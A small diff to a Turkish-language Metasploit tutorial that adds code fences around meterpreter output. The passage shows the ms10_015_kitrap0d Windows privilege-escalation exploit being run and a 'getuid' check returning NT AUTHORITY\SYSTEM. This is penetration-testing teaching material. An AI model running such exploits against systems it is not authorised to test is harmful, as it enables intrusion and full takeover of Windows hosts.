@@ -163,6 +163,8 @@ msf exploit(ms10_015_kitrap0d) > exploit
 
 Gerekli modül ve payload ayarlarını yaptıktan sonra çalıştırılan exploit, hedef sistemde bir oturum açmayı başarmıştır. Şimdi ```getuid``` komutunu verdiğimizde ```SYSTEM``` yetkili bir kullanıcı gibi hareket edilebileceği aşağıda görülmektedir.
 
+```sh
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter >
+```
